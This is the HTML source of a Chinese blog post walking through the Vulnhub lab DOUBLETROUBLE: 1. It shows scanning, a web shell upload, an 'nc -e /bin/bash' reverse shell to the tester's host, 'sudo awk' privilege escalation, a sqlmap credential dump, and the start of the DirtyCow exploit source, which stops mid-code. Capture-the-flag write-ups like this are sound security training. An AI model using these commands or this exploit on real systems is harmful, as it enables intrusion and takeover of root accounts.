@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha256-yIDrPSXHZdOZhAqiBP7CKzIwMQmRCJ8UeB8Jo17YC4o=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.css" integrity="sha256-6cQIC71/iBIYXFK+0RHAvwmjwWzkWd+r7v/BX3/vZDc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"z9m8r8.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="该文章暂无概述">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DOUBLETROUBLE: 1">
+<meta property="og:url" content="https://z9m8r8.github.io/2023/10/07/doubletrouble-1/index.html">
+<meta property="og:site_name" content="Ghost&#39;s Blog">
+<meta property="og:description" content="该文章暂无概述">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-10-07T08:10:51.000Z">
+<meta property="article:modified_time" content="2023-12-23T13:24:47.598Z">
+<meta property="article:author" content="Ghost">
+<meta property="article:tag" content="Vulnhub 靶场">
+<meta property="article:tag" content="信息收集">
+<meta property="article:tag" content="提权">
+<meta property="article:tag" content="反弹 shell">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://z9m8r8.github.io/2023/10/07/doubletrouble-1/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://z9m8r8.github.io/2023/10/07/doubletrouble-1/","path":"2023/10/07/doubletrouble-1/","title":"DOUBLETROUBLE: 1"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>DOUBLETROUBLE: 1 | Ghost's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Ghost's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">人若无名，便可专心练剑！</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">1. 信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="nav-text">1.1. 主机探测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">1.2. 端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">1.3. web信息收集</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB"><span class="nav-text">2. 渗透攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%99%BB%E5%BD%95%E8%8E%B7%E5%8F%96-shell"><span class="nav-text">2.1. 登录获取 shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">2.2. 提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B-1"><span class="nav-text">2.3. 主机探测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-1"><span class="nav-text">2.4. 端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">2.5. web 信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83-1"><span class="nav-text">2.6. 提权</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Ghost"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">Ghost</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">111</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">49</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/z9m8r8" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.cnblogs.com/z9m8r8" title="博客园 → https:&#x2F;&#x2F;www.cnblogs.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fa-solid fa-blog fa-fw"></i>博客园</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://z9m8r8.github.io/2023/10/07/doubletrouble-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Ghost">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ghost's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="DOUBLETROUBLE: 1 | Ghost's Blog">
+      <meta itemprop="description" content="该文章暂无概述">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          DOUBLETROUBLE: 1
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-10-07 16:10:51" itemprop="dateCreated datePublished" datetime="2023-10-07T16:10:51+08:00">2023-10-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-12-23 21:24:47" itemprop="dateModified" datetime="2023-12-23T21:24:47+08:00">2023-12-23</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>1.4k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>5 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">该文章暂无概述</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><blockquote>
+<p>靶机介绍及下载：<a
+target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/doubletrouble-1,743/">doubletrouble:
+1 ~ VulnHub</a></p>
+</blockquote>
+<h2 id="信息收集">1. 信息收集</h2>
+<h3 id="主机探测">1.1. 主机探测</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover  -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310062140459.png" /></p>
+<h3 id="端口扫描">1.2. 端口扫描</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.159.155 -p1-65535</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310062139224.png" /></p>
+<p>开放端口：22【弱口令】，80【web信息收集】</p>
+<h3 id="web信息收集">1.3. web信息收集</h3>
+<p>80端口是个登陆界面，qdPM 9.1 有很多漏洞【<a
+target="_blank" rel="noopener" href="https://www.exploit-db.com/">Exploit Database - Exploits for
+Penetration Testers, Researchers, and Ethical Hackers</a>
+上可以查到RCE，SQL 注入，XSS等】但都需登陆后才能利用。</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310062257918.png" /></p>
+<p>扫下目录</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310062258314.png" /></p>
+<p>根据扫描结果找有价值的信息</p>
+<p>在 <code>http://192.168.159.157/core/config/databases.yml</code>
+找到了数据库配置信息</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310062300359.png" /></p>
+<p>结合 install
+页面发现可以重置80端口登录的用户名和密码，但重置完后依旧无法登录……折腾了好长时间没找到有价值的信息，看了别人的解法才发现忽略了
+secret 下的图片，下载图片并用图片隐写工具读取信息</p>
+<figure>
+<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310062311257.jpg"
+alt="doubletrouble.jpg" />
+<figcaption aria-hidden="true">doubletrouble.jpg</figcaption>
+</figure>
+<p>kali 先安装 steghide 和 stegseek ，用 steghide
+查看已嵌入图片的文件信息，结果发现需要密码，由于 steghide
+不提供密码爆破功能，所以用 stegseek 来爆破并提取嵌入的文件信息。</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310062320699.png" /></p>
+<p>得到登录邮件和密码 <code>otisrush@localhost.com/otis666</code></p>
+<h2 id="渗透攻击">2. 渗透攻击</h2>
+<h3 id="登录获取-shell">2.1. 登录获取 shell</h3>
+<p>用前面获得的 <code>otisrush@localhost.com/otis666</code> 登录，在 <a
+target="_blank" rel="noopener" href="https://www.exploit-db.com/">Exploit Database - Exploits for
+Penetration Testers, Researchers, and Ethical Hackers</a>
+看了几个漏洞的利用本质是利用更新用户信息 photo 来实现 shell
+的上传，为此尝试上传一句话木马</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310070024868.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310070024926.png" /></p>
+<p>根据 <a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/47954">qdPM 9.1 -
+Remote Code Execution - PHP webapps Exploit</a> 知上传后的路径在 <a
+target="_blank" rel="noopener" href="http://192.168.159.157/uploads/users/">http://192.168.159.157/uploads/users/</a>
+下，蚁剑连接。</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310070027741.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310070028035.png" /></p>
+<p>找了下没找到 flag，可能权限不够导致的，考虑提权</p>
+<h3 id="提权">2.2. 提权</h3>
+<p><strong>查权限</strong></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310070041843.png" /></p>
+<blockquote>
+<p><strong>当渗透进系统并获得一个低权限shell后，如果允许当前用户通过
+sudo 执行awk命令，可以通过
+<code>sudo awk 'BEGIN &#123;system("/bin/bash")&#125;'</code> 进行提权。</strong>
+<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/awk/">awk GTFOBins</a></p>
+</blockquote>
+<p>而由上图可以看到出现了awk命令的帮助文档，说明<strong>可以通过sudo执行awk命令</strong>，注意蚁剑终端是不能直接提权的，试了下nc，结果当前权限可以正常执行，为此用
+nc 反弹 shell 提权</p>
+<p>蚁剑终端执行：<code>nc -e /bin/bash 192.168.159.152 4445</code></p>
+<p>kali 监听：<code>nc -nvlp 4445</code></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310070047158.png" /></p>
+<p>shell 有局限性，<strong>调用本地终端获取更高级的交互
+shell</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310070101519.png" /></p>
+<p>flag 没找到，但在根目录找到另一个虚拟机，可以用
+<code>python3 -m http.server</code>
+在靶机开个http服务下载，也可以用nc传递文件，kali中：<code>nc -lvvp 4446 &gt; doubletrouble.ova</code>，靶机中：<code>nc 192.168.159.152 4446 &lt; doubletrouble.ova</code>。本地VM将下载的第二个靶机导入</p>
+<h3 id="主机探测-1">2.3. 主机探测</h3>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310070123357.png" /></p>
+<h3 id="端口扫描-1">2.4. 端口扫描</h3>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310070124441.png" /></p>
+<p>所开端口：22，80</p>
+<h3 id="web-信息收集">2.5. web 信息收集</h3>
+<p>80端口是个登录界面</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310071203925.png" /></p>
+<p>登录处发现存在 SQL 注入</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r post.txt --batch -D doubletrouble -T users --dump</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310071226946.png" /></p>
+<p>拿到两个用户信息，在22端口登录测试下，<code>clapton/ZubZub99</code>
+可以进去，拿到第一个 flag</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310071229417.png" /></p>
+<h3 id="提权-1">2.6. 提权</h3>
+<p>查内核版本</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310071231368.png" /></p>
+<p>存在脏牛提权漏洞</p>
+<blockquote>
+<p><a
+target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/439091715">从零入门linux内核安全：脏牛提权漏洞分析与补丁分析（CVE-2016-5195）
+- 知乎</a> <a
+target="_blank" rel="noopener" href="https://www.cnblogs.com/mrliu0327/p/13456502.html">脏牛(DirtyCow)Linux本地提权漏洞复现(CVE-2016-5195)
+- 无名之辈。 - 博客园</a></p>
+</blockquote>
+<p>POC.c【<a
+target="_blank" rel="noopener" href="https://github.com/FireFart/dirtycow/blob/master/dirty.c">dirty.c</a>】</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This exploit uses the pokemon exploit of the dirtycow vulnerability</span></span><br><span class="line"><span class="comment">// as a base and automatically generates a new passwd line.</span></span><br><span class="line"><span class="comment">// The user will be prompted for the new password when the binary is run.</span></span><br><span class="line"><span class="comment">// The original /etc/passwd file is then backed up to /tmp/passwd.bak</span></span><br><span class="line"><span class="comment">// and overwrites the root account with the generated line.</span></span><br><span class="line"><span class="comment">// After running the exploit you should be able to login with the newly</span></span><br><span class="line"><span class="comment">// created user.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// To use this exploit modify the user values according to your needs.</span></span><br><span class="line"><span class="comment">//   The default is &quot;firefart&quot;.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Original exploit (dirtycow&#x27;s ptrace_pokedata &quot;pokemon&quot; method):</span></span><br><span class="line"><span class="comment">//   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Compile with:</span></span><br><span class="line"><span class="comment">//   gcc -pthread dirty.c -o dirty -lcrypt</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Then run the newly create binary by either doing:</span></span><br><span class="line"><span class="comment">//   &quot;./dirty&quot; or &quot;./dirty my-new-password&quot;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Afterwards, you can either &quot;su firefart&quot; or &quot;ssh firefart@...&quot;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// DON&#x27;T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!</span></span><br><span class="line"><span class="comment">//   mv /tmp/passwd.bak /etc/passwd</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Exploit adopted by Christian &quot;FireFart&quot; Mehlmauer</span></span><br><span class="line"><span class="comment">// https://firefart.at</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;crypt.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *filename = <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *backup_filename = <span class="string">&quot;/tmp/passwd.bak&quot;</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *salt = <span class="string">&quot;firefart&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> f;</span><br><span class="line"><span class="type">void</span> *<span class="built_in">map</span>;</span><br><span class="line"><span class="type">pid_t</span> pid;</span><br><span class="line"><span class="type">pthread_t</span> pth;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Userinfo</span> &#123;</span></span><br><span class="line">   <span class="type">char</span> *username;</span><br><span class="line">   <span class="type">char</span> 